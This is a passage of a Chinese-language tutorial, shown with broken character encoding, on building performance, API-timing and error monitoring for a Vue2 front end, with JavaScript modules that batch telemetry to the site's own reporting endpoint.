strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p>åœ¨ Vue2 é¡¹ç›®ä¸­æ­å»º<strong>å‰ç«¯ç›‘æ§ä½“ç³»</strong>ï¼Œæ ¸å¿ƒè¦è¦†ç›–ã€Œæ€§èƒ½ç›‘æ§ã€é”™è¯¯ç›‘æ§ã€ç”¨æˆ·è¡Œä¸ºç›‘æ§ã€ä¸‰å¤§ç»´åº¦ï¼Œä»¥ä¸‹æ˜¯ä¸€å¥—å¯è½åœ°çš„å®Œæ•´æ–¹æ¡ˆï¼ŒåŒ…å«æŠ€æœ¯é€‰å‹ã€ä»£ç å®ç°ã€æ•°æ®ä¸ŠæŠ¥ã€å¯è§†åŒ–åˆ†æå…¨æµç¨‹ï¼š</p>
<h4 data-id="heading-0">ä¸€ã€æ•´ä½“æ¶æ„è®¾è®¡</h4>
<p>ç›‘æ§ä½“ç³»åˆ†ä¸º 3 å±‚ï¼Œè½»é‡åŒ–æ¥å…¥ä¸”ä¸å½±å“ä¸»æµç¨‹æ€§èƒ½ï¼š</p>
<pre><code class="hljs language-js" lang="js">å‰ç«¯é‡‡é›†å±‚ï¼ˆ<span class="hljs-title class_">Vue2</span> é¡¹ç›®ï¼‰â†’ æ•°æ®ä¸ŠæŠ¥å±‚ï¼ˆæ¥å£/åŸ‹ç‚¹å¹³å°ï¼‰â†’ åå°åˆ†æå±‚ï¼ˆå¯è§†åŒ–/å‘Šè­¦ï¼‰
</code></pre>
<ul>
<li>é‡‡é›†å±‚ï¼šé€šè¿‡ Vue é’©å­ã€æµè§ˆå™¨ API é‡‡é›†æ€§èƒ½ / é”™è¯¯ / è¡Œä¸ºæ•°æ®ï¼›</li>
<li>ä¸ŠæŠ¥å±‚ï¼šæ‰¹é‡ + é˜²æŠ–ä¸ŠæŠ¥ï¼Œé¿å…é¢‘ç¹è¯·æ±‚ï¼›</li>
<li>åˆ†æå±‚ï¼šå¯é€‰å¼€æºå·¥å…·ï¼ˆGrafana/ELKï¼‰æˆ–ç¬¬ä¸‰æ–¹å¹³å°ï¼ˆFundebug / ç›‘æ§å®ï¼‰ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-1">äºŒã€æ€§èƒ½ç›‘æ§ï¼ˆæ ¸å¿ƒç›‘æ§é¦–å± / é¡µé¢åŠ è½½ / æ¥å£æ€§èƒ½ï¼‰</h3>
<h4 data-id="heading-2">1. æ ¸å¿ƒé‡‡é›†æŒ‡æ ‡</h4>
<ul>
<li>é¡µé¢æ€§èƒ½ï¼šFP/FCP/LCP/TTIï¼ˆé€šè¿‡Â <code>performance</code>Â APIï¼‰ï¼›</li>
<li>æ¥å£æ€§èƒ½ï¼šè¯·æ±‚è€—æ—¶ / æˆåŠŸç‡ / çŠ¶æ€ç ï¼›</li>
<li>Vue æ€§èƒ½ï¼šç»„ä»¶æ¸²æŸ“è€—æ—¶ï¼ˆé€šè¿‡ Vue é’©å­ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-3">2. ä»£ç å®ç°ï¼ˆVue2 ä¸­å°è£…æ€§èƒ½ç›‘æ§æ¨¡å—ï¼‰</h4>
<p>æ–°å»ºÂ <code>src/utils/performanceMonitor.js</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * æ€§èƒ½ç›‘æ§æ ¸å¿ƒæ¨¡å—
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-comment">// åˆå§‹åŒ–æ€§èƒ½ç›‘æ§</span>
  <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 1. é¡µé¢åŠ è½½æ€§èƒ½ï¼ˆDOMContentLoaded åé‡‡é›†ï¼‰</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'DOMContentLoaded'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">collectPagePerformance</span>);
    <span class="hljs-comment">// 2. æ¥å£æ€§èƒ½ç›‘æ§ï¼ˆé‡å†™ axiosï¼‰</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">wrapAxios</span>();
    <span class="hljs-comment">// 3. Vue ç»„ä»¶æ¸²æŸ“æ€§èƒ½ï¼ˆå…¨å±€æ··å…¥ï¼‰</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">wrapVueComponent</span>();
  },

  <span class="hljs-comment">// é‡‡é›†é¡µé¢æ ¸å¿ƒæ€§èƒ½æŒ‡æ ‡</span>
  <span class="hljs-title function_">collectPagePerformance</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> perf = performance.<span class="hljs-title function_">getEntriesByType</span>(<span class="hljs-string">'navigation'</span>)[<span class="hljs-number">0</span>];
    <span class="hljs-keyword">if</span> (!perf) <span class="hljs-keyword">return</span>;

    <span class="hljs-comment">// æ ¸å¿ƒæ€§èƒ½æŒ‡æ ‡ï¼ˆå¯¹åº”é¦–å±/åŠ è½½ç›¸å…³ï¼‰</span>
    <span class="hljs-keyword">const</span> performanceData = {
      <span class="hljs-attr">type</span>: <span class="hljs-string">'performance'</span>,
      <span class="hljs-attr">pageUrl</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>,
      <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
      <span class="hljs-comment">// åŸºç¡€åŠ è½½æŒ‡æ ‡</span>
      <span class="hljs-attr">domReadyTime</span>: perf.<span class="hljs-property">domContentLoadedEventEnd</span> - perf.<span class="hljs-property">navigationStart</span>, <span class="hljs-comment">// DOM å°±ç»ªæ—¶é—´</span>
      <span class="hljs-attr">loadTime</span>: perf.<span class="hljs-property">loadEventEnd</span> - perf.<span class="hljs-property">navigationStart</span>, <span class="hljs-comment">// é¡µé¢å®Œå…¨åŠ è½½æ—¶é—´</span>
      <span class="hljs-comment">// å…³é”®ç»˜åˆ¶æŒ‡æ ‡</span>
      <span class="hljs-attr">fp</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getFP</span>(), <span class="hljs-comment">// é¦–æ¬¡ç»˜åˆ¶</span>
      <span class="hljs-attr">fcp</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getFCP</span>(), <span class="hljs-comment">// é¦–æ¬¡å†…å®¹ç»˜åˆ¶</span>
      <span class="hljs-attr">lcp</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getLCP</span>(), <span class="hljs-comment">// æœ€å¤§å†…å®¹ç»˜åˆ¶</span>
    };

    <span class="hljs-comment">// ä¸ŠæŠ¥æ€§èƒ½æ•°æ®ï¼ˆé˜²æŠ–æ‰¹é‡ä¸ŠæŠ¥ï¼‰</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">report</span>(performanceData);
  },

  <span class="hljs-comment">// è·å– FPï¼ˆé¦–æ¬¡ç»˜åˆ¶ï¼‰</span>
  <span class="hljs-title function_">getFP</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> entries = performance.<span class="hljs-title function_">getEntriesByType</span>(<span class="hljs-string">'paint'</span>);
    <span class="hljs-keyword">const</span> fpEntry = entries.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">name</span> === <span class="hljs-string">'first-paint'</span>);
    <span class="hljs-keyword">return</span> fpEntry ? fpEntry.<span class="hljs-property">startTime</span> : <span class="hljs-number">0</span>;
  },

  <span class="hljs-comment">// è·å– FCPï¼ˆé¦–æ¬¡å†…å®¹ç»˜åˆ¶ï¼‰</span>
  <span class="hljs-title function_">getFCP</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> entries = performance.<span class="hljs-title function_">getEntriesByType</span>(<span class="hljs-string">'paint'</span>);
    <span class="hljs-keyword">const</span> fcpEntry = entries.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">name</span> === <span class="hljs-string">'first-contentful-paint'</span>);
    <span class="hljs-keyword">return</span> fcpEntry ? fcpEntry.<span class="hljs-property">startTime</span> : <span class="hljs-number">0</span>;
  },

  <span class="hljs-comment">// è·å– LCPï¼ˆæœ€å¤§å†…å®¹ç»˜åˆ¶ï¼‰</span>
  <span class="hljs-title function_">getLCP</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {
      <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceObserver</span>(<span class="hljs-function">(<span class="hljs-params">entryList</span>) =&gt;</span> {
        <span class="hljs-keyword">const</span> entries = entryList.<span class="hljs-title function_">getEntries</span>();
        <span class="hljs-keyword">const</span> lcpEntry = entries[entries.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>];
        <span class="hljs-title function_">resolve</span>(lcpEntry ? lcpEntry.<span class="hljs-property">startTime</span> : <span class="hljs-number">0</span>);
      }).<span class="hljs-title function_">observe</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">'largest-contentful-paint'</span>, <span class="hljs-attr">buffered</span>: <span class="hljs-literal">true</span> });
    });
  },

  <span class="hljs-comment">// é‡å†™ axios ç›‘æ§æ¥å£æ€§èƒ½</span>
  <span class="hljs-title function_">wrapAxios</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> axios = <span class="hljs-built_in">require</span>(<span class="hljs-string">'axios'</span>);
    <span class="hljs-keyword">const</span> originalRequest = axios.<span class="hljs-property">request</span>;

    axios.<span class="hljs-property">request</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">config</span>) {
      <span class="hljs-keyword">const</span> startTime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
      <span class="hljs-comment">// å‘é€è¯·æ±‚</span>
      <span class="hljs-keyword">return</span> originalRequest.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, config).<span class="hljs-title function_">then</span>(
        <span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> {
          <span class="hljs-comment">// æˆåŠŸï¼šé‡‡é›†è€—æ—¶/çŠ¶æ€ç </span>
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">report</span>({
            <span class="hljs-attr">type</span>: <span class="hljs-string">'api'</span>,
            <span class="hljs-attr">pageUrl</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>,
            <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
            <span class="hljs-attr">url</span>: config.<span class="hljs-property">url</span>,
            <span class="hljs-attr">method</span>: config.<span class="hljs-property">method</span>,
            <span class="hljs-attr">status</span>: response.<span class="hljs-property">status</span>,
            <span class="hljs-attr">costTime</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - startTime,
            <span class="hljs-attr">isSuccess</span>: <span class="hljs-literal">true</span>,
          });
          <span class="hljs-keyword">return</span> response;
        },
        <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
          <span class="hljs-comment">// å¤±è´¥ï¼šé‡‡é›†é”™è¯¯ä¿¡æ¯</span>
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">report</span>({
            <span class="hljs-attr">type</span>: <span class="hljs-string">'api'</span>,
            <span class="hljs-attr">pageUrl</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>,
            <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
            <span class="hljs-attr">url</span>: config.<span class="hljs-property">url</span>,
            <span class="hljs-attr">method</span>: config.<span class="hljs-property">method</span>,
            <span class="hljs-attr">status</span>: error.<span class="hljs-property">response</span>?.<span class="hljs-property">status</span> || <span class="hljs-string">'network error'</span>,
            <span class="hljs-attr">costTime</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - startTime,
            <span class="hljs-attr">isSuccess</span>: <span class="hljs-literal">false</span>,
            <span class="hljs-attr">errorMsg</span>: error.<span class="hljs-property">message</span>,
          });
          <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">reject</span>(error);
        }
      );
    };
  },

  <span class="hljs-comment">// ç›‘æ§ Vue ç»„ä»¶æ¸²æŸ“è€—æ—¶</span>
  <span class="hljs-title function_">wrapVueComponent</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">mixin</span>({
      <span class="hljs-title function_">beforeCreate</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">$performanceStart</span> = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
      },
      <span class="hljs-title function_">mounted</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">const</span> renderTime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - <span class="hljs-variable language_">this</span>.<span class="hljs-property">$performanceStart</span>;
        <span class="hljs-comment">// ä»…ç›‘æ§æ¸²æŸ“è€—æ—¶ &gt; 100ms çš„ç»„ä»¶ï¼ˆè¿‡æ»¤å°ç»„ä»¶ï¼Œå‡å°‘æ•°æ®é‡ï¼‰</span>
        <span class="hljs-keyword">if</span> (renderTime &gt; <span class="hljs-number">100</span>) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">report</span>({
            <span class="hljs-attr">type</span>: <span class="hljs-string">'vue-component'</span>,
            <span class="hljs-attr">pageUrl</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>,
            <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
            <span class="hljs-attr">componentName</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">$options</span>.<span class="hljs-property">name</span> || <span class="hljs-string">'unknown'</span>,
            renderTime,
          });
        }
      },
    });
  },

  <span class="hljs-comment">// æ•°æ®ä¸ŠæŠ¥ï¼ˆé˜²æŠ–+æ‰¹é‡ï¼Œé¿å…é¢‘ç¹è¯·æ±‚ï¼‰</span>
  <span class="hljs-title function_">report</span>(<span class="hljs-params">data</span>) {
    <span class="hljs-comment">// 1. ç¼“å­˜æ•°æ®åˆ°æ•°ç»„</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">__monitorCache</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">__monitorCache</span> || [];
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">__monitorCache</span>.<span class="hljs-title function_">push</span>(data);

    <span class="hljs-comment">// 2. é˜²æŠ–ä¸ŠæŠ¥ï¼ˆ5s å†…åªä¸ŠæŠ¥ä¸€æ¬¡ï¼Œæˆ–ç¼“å­˜è¶…è¿‡ 10 æ¡ç«‹å³ä¸ŠæŠ¥ï¼‰</span>
    <span class="hljs-built_in">clearTimeout</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">__monitorTimer</span>);
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>.<span class="hljs-property">__monitorCache</span>.<span class="hljs-property">length</span> &gt;= <span class="hljs-number">10</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">sendReport</span>();
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">window</span>.<span class="hljs-property">__monitorTimer</span> = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">sendReport</span>();
      }, <span class="hljs-number">5000</span>);
    }
  },

  <span class="hljs-comment">// å‘é€ä¸ŠæŠ¥è¯·æ±‚ï¼ˆå¯¹æ¥åå°/ç¬¬ä¸‰æ–¹å¹³å°ï¼‰</span>
  <span class="hljs-title function_">sendReport</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> cache = <span class="hljs-variable language_">window</span>.<span class="hljs-property">__monitorCache</span> || [];
    <span class="hljs-keyword">if</span> (cache.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-comment">// ä¸ŠæŠ¥æ¥å£ï¼ˆæ›¿æ¢ä¸ºä½ çš„åå°æ¥å£ï¼‰</span>
    axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/api/monitor/report'</span>, {
      <span class="hljs-attr">data</span>: cache,
      <span class="hljs-attr">userAgent</span>: navigator.<span class="hljs-property">userAgent</span>,
      <span class="hljs-attr">userId</span>: <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'userId'</span>) || <span class="hljs-string">'anonymous'</span>, <span class="hljs-comment">// å…³è”ç”¨æˆ·</span>
    }).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
      <span class="hljs-comment">// ä¸ŠæŠ¥å¤±è´¥ï¼šç¼“å­˜åˆ° localStorageï¼Œä¸‹æ¬¡é‡è¯•</span>
      <span class="hljs-keyword">const</span> failCache = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'monitorFailCache'</span>) || <span class="hljs-string">'[]'</span>);
      failCache.<span class="hljs-title function_">push</span>(...cache);
      <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'monitorFailCache'</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(failCache));
    });

    <span class="hljs-comment">// æ¸…ç©ºç¼“å­˜</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">__monitorCache</span> = [];
  },
};
</code></pre>
<h4 data-id="heading-4">3. åœ¨ Vue2 å…¥å£æŒ‚è½½</h4>
<p>ä¿®æ”¹Â <code>src/main.js</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Vue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>;
<span class="hljs-keyword">import</span> performanceMonitor <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils/performanceMonitor'</span>;

<span class="hljs-comment">// åˆå§‹åŒ–æ€§èƒ½ç›‘æ§ï¼ˆç”Ÿäº§ç¯å¢ƒæ‰å¼€å¯ï¼‰</span>
<span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">'production'</span>) {
  performanceMonitor.<span class="hljs-title function_">init</span>();
}

<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
  <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,
  <span class="hljs-attr">render</span>: <span class="hljs-function"><span class="hljs-params">h</span> =&gt;</span> <span class="hljs-title function_">h</span>(<span class="hljs-title class_">App</span>)
});
</code></pre>
<hr/>
<h3 data-id="heading-5">ä¸‰ã€é”™è¯¯ç›‘æ§ï¼ˆæ•è·ä»£ç  / æ¥å£ / Vue è¿è¡Œæ—¶é”™è¯¯ï¼‰</h3>
<h4 data-id="heading-6">1. æ ¸å¿ƒæ•è·åœºæ™¯</h4>
<ul>
<li>Vue è¿è¡Œæ—¶é”™è¯¯ï¼ˆé€šè¿‡Â <code>Vue.config.errorHandler</code>ï¼‰ï¼›</li>
<li>JS å…¨å±€é”™è¯¯ï¼ˆ<code>window.onerror</code>ï¼‰ï¼›</li>
<li>èµ„æºåŠ è½½é”™è¯¯ï¼ˆå›¾ç‰‡ / è„šæœ¬ / æ ·å¼ï¼Œ<code>window.addEventListener('error')</code>ï¼‰ï¼›</li>
<li>Promise æœªæ•è·é”™è¯¯ï¼ˆ<code>window.addEventListener('unhandledrejection')</code>ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-7">2. ä»£ç å®ç°ï¼ˆæ–°å»ºÂ <code>src/utils/errorMonitor.js</code>ï¼‰</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * é”™è¯¯ç›‘æ§æ ¸å¿ƒæ¨¡å—
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 1. æ•è· Vue è¿è¡Œæ—¶é”™è¯¯</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">catchVueError</span>();
    <span class="hljs-comment">// 2. æ•è· JS å…¨å±€é”™è¯¯</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">catchJsError</span>();
    <span class="hljs-comment">// 3. æ•è·èµ„æºåŠ è½½é”™è¯¯</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">catchResourceError</span>();
    <span class="hljs-comment">// 4. æ•è· Promise æœªå¤„ç†é”™è¯¯</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">catchPromiseError</span>();
  },

  <span class="hljs-comment">// æ•è· Vue å†…éƒ¨é”™è¯¯</span>
  <span class="hljs-title function_">catchVueError</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">errorHandler</span> = <span class="hljs-function">(<span class="hljs-params">err, vm, info</span>) =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">report</span>({
        <span class="hljs-attr">type</span>: <span class="hljs-string">'vue-error'</span>,
        <span class="hljs-attr">pageUrl</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>,
        <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
        <span class="hljs-attr">message</span>: err.<span class="hljs-property">message</span>,
        <span class="hljs-attr">stack</span>: err.<span class="hljs-property">stack</span>,
        <span class="hljs-attr">component</span>: vm.<span class="hljs-property">$options</span>.<span class="hljs-property">name</span> || <span class="hljs-string">'unknown'</span>,
        <span class="hljs-attr">info</span>: info, <span class="hljs-comment">// Vue é”™è¯¯ä¿¡æ¯ï¼ˆå¦‚ç”Ÿå‘½å‘¨æœŸé’©å­ï¼‰</span>
      });
    };
  },

  <span class="hljs-comment">// æ•è· JS å…¨å±€é”™è¯¯</span>
  <span class="hljs-title function_">catchJsError</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">onerror</span> = <span class="hljs-function">(<span class="hljs-params">message, source, line, column, error</span>) =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">report</span>({
        <span class="hljs-attr">type</span>: <span class="hljs-string">'js-error'</span>,
        <span class="hljs-attr">pageUrl</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>,
        <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
        message,
        source, <span class="hljs-comment">// é”™è¯¯æ–‡ä»¶åœ°å€</span>
        line, <span class="hljs-comment">// è¡Œå·</span>
        column, <span class="hljs-comment">// åˆ—å·</span>
        <span class="hljs-attr">stack</span>: error?.<span class="hljs-property">stack</span> || <span class="hljs-string">''</span>,
      });
      <span class="hljs-comment">// é˜»æ­¢é»˜è®¤è¡Œä¸ºï¼Œé¿å…æµè§ˆå™¨æ§åˆ¶å°é‡å¤è¾“å‡º</span>
      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    };
  },

  <span class="hljs-comment">// æ•è·èµ„æºåŠ è½½é”™è¯¯ï¼ˆå›¾ç‰‡/è„šæœ¬/æ ·å¼ï¼‰</span>
  <span class="hljs-title function_">catchResourceError</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'error'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> target = e.<span class="hljs-property">target</span>;
      <span class="hljs-comment">// è¿‡æ»¤èµ„æºé”™è¯¯ï¼ˆéå…ƒç´ é”™è¯¯è·³è¿‡ï¼‰</span>
      <span class="hljs-keyword">if</span> (target <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">HTMLImageElement</span> || target <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">HTMLLinkElement</span> || target <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">HTMLScriptElement</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">report</span>({
          <span class="hljs-attr">type</span>: <span class="hljs-string">'resource-error'</span>,
          <span class="hljs-attr">pageUrl</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>,
          <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
          <span class="hljs-attr">resourceType</span>: target.<span class="hljs-property">tagName</span>.<span class="hljs-title function_">toLowerCase</span>(),
          <span class="hljs-attr">resourceUrl</span>: target.<span class="hljs-property">src</span> || target.<span class="hljs-property">href</span>,
          <span class="hljs-attr">message</span>: <span class="hljs-string">`Resource load failed: <span class="hljs-subst">${target.src || target.href}</span>`</span>,
        });
      }
    }, <span class="hljs-literal">true</span>); <span class="hljs-comment">// æ•è·é˜¶æ®µè§¦å‘ï¼Œé¿å…å†’æ³¡ä¸¢å¤±</span>
  },

  <span class="hljs-comment">// æ•è· Promise æœªå¤„ç†é”™è¯¯</span>
  <span class="hljs-title function_">catchPromiseError</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'unhandledrejection'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">report</span>({
        <span class="hljs-attr">type</span>: <span class="hljs-string">'promise-error'</span>,
        <span class="hljs-attr">pageUrl</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>,
        <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
        <span class="hljs-attr">message</span>: e.<span class="hljs-property">reason</span>?.<span class="hljs-property">message</span> || <span class="hljs-string">'Promise rejection'</span>,
        <span class="hljs-attr">stack</span>: e.<span class="hljs-property">reason</span>?.<span class="hljs-property">stack</span> || <span class="hljs-string">''</span>,
      });
      <span class="hljs-comment">// é˜»æ­¢é»˜è®¤è¡Œä¸º</span>
      e.<span class="hljs-title function_">preventDefault</span>();
    });
  },

  <span class="hljs-comment">// å¤ç”¨æ€§èƒ½ç›‘æ§çš„ä¸ŠæŠ¥æ–¹æ³•ï¼ˆç»Ÿä¸€ä¸ŠæŠ¥å…¥å£ï¼‰</span>
  <span class="hljs-attr">report</span>: performanceMonitor.<span class="hljs-property">report</span>,
};
</code></pre>
<h4 data-id="heading-8">3. æŒ‚è½½åˆ°å…¥å£ï¼ˆ<code>main.js</code>ï¼‰</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> errorMonitor <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils/errorMonitor'</span>;

<span class="hljs-keyword">if</span> (process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">'production'</span>) {
  performanceMonitor.<span class="hljs-title function_">init</span>();
